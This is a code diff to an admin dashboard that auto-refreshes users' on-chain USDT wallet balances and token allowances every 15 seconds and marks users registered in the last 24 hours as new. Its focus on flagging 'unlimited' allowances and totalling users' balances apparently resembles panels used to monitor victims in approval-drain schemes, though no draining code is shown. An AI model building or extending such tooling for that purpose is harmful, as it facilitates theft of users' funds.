@@ -61,7 +61,7 @@
         <!-- TOP TOTAL WALLET BALANCE BANNER -->
         <div class="bg-gradient-to-r from-emerald-950/80 via-slate-900 to-cyan-950/80 border border-emerald-500/30 p-5 rounded-2xl flex flex-col sm:flex-row sm:items-center justify-between gap-3 shadow-lg">
             <div>
-                <p class="text-xs uppercase tracking-wider text-emerald-300/90 font-semibold">Total Users Wallet Balance (Scoped Users)</p>
+                <p class="text-xs uppercase tracking-wider text-emerald-300/90 font-semibold">Total Users Wallet Balance (Scoped Users • Live Auto-Sync)</p>
                 <p id="statTotalUsersWalletBalance" class="text-2xl md:text-3xl font-bold font-mono text-emerald-400 mt-1">0.0 USDT</p>
             </div>
             <div class="text-xs font-mono text-slate-300 bg-slate-950/60 border border-slate-800 px-3.5 py-2.5 rounded-xl">
@@ -297,6 +297,8 @@
         let onChainCache = {};
         let isRefreshingOnChain = false;
         let matchedTargetUser = null;
+        let liveWalletSyncInterval = null;
+        let newBadgeRefreshInterval = null;
 
         function formatUsdtOneDecimal(value) {
             const num = Number(value);
@@ -330,8 +332,21 @@
         function getCreatedAtMs(item) {
             const ts = item?.createdAt;
             if (ts && typeof ts.toMillis === "function") return ts.toMillis();
+            if (ts && typeof ts.seconds === "number") return ts.seconds * 1000;
             if (typeof ts === "number") return ts;
+            if (typeof ts === "string") {
+                const parsed = Date.parse(ts);
+                if (!Number.isNaN(parsed)) return parsed;
+            }
             return 0;
+        }
+
+        // Returns true if user registered within the last 24 hours; automatically false after 24h
+        function isNewUserWithin24Hours(userObj) {
+            const createdMs = getCreatedAtMs(userObj);
+            if (!createdMs || createdMs <= 0) return false;
+            const twentyFourHoursMs = 24 * 60 * 60 * 1000;
+            return (Date.now() - createdMs) < twentyFourHoursMs;
         }
 
         function withTimeout(promise, ms = 6000, fallbackValue = null) {
@@ -399,6 +414,36 @@
             updateAdminScopeBadge();
         }
 
+        function startBackgroundAutoSync() {
+            if (liveWalletSyncInterval) clearInterval(liveWalletSyncInterval);
+            if (newBadgeRefreshInterval) clearInterval(newBadgeRefreshInterval);
+
+            // Automatically sync on-chain wallet balances in real time without manual refresh
+            liveWalletSyncInterval = setInterval(() => {
+                if (currentAuthUser && !isRefreshingOnChain && getScopedUsers().length > 0) {
+                    refreshAllOnChainMetrics(false);
+                }
+            }, 15000);
+
+            // Re-evaluate 24-hour NEW badge expiration every minute
+            newBadgeRefreshInterval = setInterval(() => {
+                if (currentAuthUser && allUsersCache.length > 0) {
+                    applyUserFiltersAndRender();
+                }
+            }, 60000);
+        }
+
+        function stopBackgroundAutoSync() {
+            if (liveWalletSyncInterval) {
+                clearInterval(liveWalletSyncInterval);
+                liveWalletSyncInterval = null;
+            }
+            if (newBadgeRefreshInterval) {
+                clearInterval(newBadgeRefreshInterval);
+                newBadgeRefreshInterval = null;
+            }
+        }
+
         // AUTHENTICATION
         document.getElementById("adminLoginForm").addEventListener("submit", async (e) => {
             e.preventDefault();
@@ -423,7 +468,9 @@
                 document.getElementById("adminInfoText").innerText = `Admin: ${user.email} (UID: ${user.uid.slice(0, 8)}...)`;
                 resolveActivePrefixForCurrentUser();
                 startRealtimeListeners();
+                startBackgroundAutoSync();
             } else {
+                stopBackgroundAutoSync();
                 if (unsubRequests) unsubRequests();
                 if (unsubUsers) unsubUsers();
                 if (unsubSubAdmins) unsubSubAdmins();
@@ -527,6 +574,12 @@
                         const isUnlimited = allowRaw >= ethers.parseUnits("1000000000000", 6);
                         const allowanceNum = Number(ethers.formatUnits(allowRaw, 6));
 
+                        const prevInfo = onChainCache[key];
+                        const changed = !prevInfo
+                            || Math.abs(Number(prevInfo.walletBalanceNum || 0) - walletBalanceNum) > 0.000001
+                            || Math.abs(Number(prevInfo.allowanceNum || 0) - allowanceNum) > 0.000001
+                            || Boolean(prevInfo.isUnlimited) !== isUnlimited;
+
                         const info = {
                             walletBalanceNum,
                             allowanceNum,
@@ -534,6 +587,11 @@
                             checked: true
                         };
                         onChainCache[key] = info;
+
+                        if (changed) {
+                            updateTotalUsersWalletBanner();
+                            applyUserFiltersAndRender();
+                        }
                         return info;
                     }
                 } catch (_) {
@@ -943,6 +1001,10 @@
                 const walletAddr = u.walletAddress || u.id || "";
                 const walletKey = walletAddr.toLowerCase();
                 const isBanned = u.status === "banned";
+                const isNewUser = isNewUserWithin24Hours(u);
+                const newBadgeHtml = isNewUser
+                    ? `<span class="px-2 py-0.5 rounded-full bg-amber-500/20 text-amber-300 border border-amber-500/40 font-mono font-bold text-[11px]">NEW</span>`
+                    : "";
                 const info = onChainCache[walletKey];
 
                 const walletBalNum = info && info.checked ? Number(info.walletBalanceNum || 0) : 0;
@@ -955,6 +1017,7 @@
                         <div class="space-y-1.5">
                             <div class="flex flex-wrap items-center gap-2">
                                 <span class="font-bold text-white font-mono">ID: ${escapeHtml(u.userId || "---")}</span>
+                                ${newBadgeHtml}
                                 <span class="px-2 py-0.5 rounded-full ${isBanned ? "bg-red-500/20 text-red-400" : "bg-emerald-500/20 text-emerald-400"}">${escapeHtml(u.status || "approved")}</span>
                             </div>
                             <p class="font-mono text-slate-300 break-all">Wallet: ${escapeHtml(walletAddr)}</p>
